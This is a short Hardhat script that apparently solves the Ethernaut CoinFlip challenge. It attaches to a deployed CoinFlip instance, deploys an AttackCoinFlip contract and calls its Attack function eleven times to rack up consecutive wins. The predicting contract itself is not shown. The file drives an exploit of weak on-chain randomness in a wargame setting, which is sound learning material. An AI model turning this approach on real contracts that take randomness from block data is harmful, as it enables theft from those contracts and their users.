const hre = require("hardhat");

async function main() {
  const CoinFlipContract = await hre.ethers.getContractFactory("CoinFlip");
  // attach your instance address
  const Instance = "0x743Aa724C7A2e78e4A6e511Ab8CD0CA998a99CA6";
  const CoinFlip = CoinFlipContract.attach(Instance);

  const consecutiveCount = await CoinFlip.consecutiveWins();
  console.log(`consecutiveWins -->  ${consecutiveCount}`);

  const AttackContract = await ethers.getContractFactory("AttackCoinFlip");
  const Attack = await AttackContract.deploy(Instance);
  await Attack.deployed();

  console.log("Attacking...");
  for (let i = 0; i < 11; i++) {
    const tx = await Attack.Attack();
    await tx.wait(1);
  }

  const updatedConsecutiveCount = await CoinFlip.consecutiveWins();
  console.log(`consecutiveWins -->  ${updatedConsecutiveCount}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
